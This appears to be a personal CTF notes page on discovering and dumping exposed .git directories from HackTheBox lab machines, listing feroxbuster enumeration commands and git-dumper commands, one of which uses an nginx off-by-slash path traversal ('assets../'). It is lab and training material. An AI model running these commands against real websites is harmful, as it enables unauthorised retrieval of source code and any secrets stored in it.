# GitHub content access

### Enumeration

{% code overflow="wrap" %}
```bash
export URL=http://pilgrimage.htb/

# Start with quickhits.txt to enumerate .git directory
feroxbuster -e -u "$URL" -x html txt php js zip bak xml -t 200 -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt
feroxbuster -e -u "$URL" -x html txt php js -t 200 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
feroxbuster -e -u "$URL" -x html txt php js zip bak xml -t 200 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
```
{% endcode %}

### Dumping content

```bash
# Install git_dumper
python -m venv venv
source venv/bin/activate.fish # fish! 
pip3 install git_dumper

# Dump the content
git-dumper http://piligrimage.htb/.git git

# This site has off by slash vulnerability so the path contain assets../ 
# Nginxatsu HackTheBox CTF Write-up | by d4rkstat1c | Medium 
git-dumper http://cybermonday.htb/assets../.git/ git
```

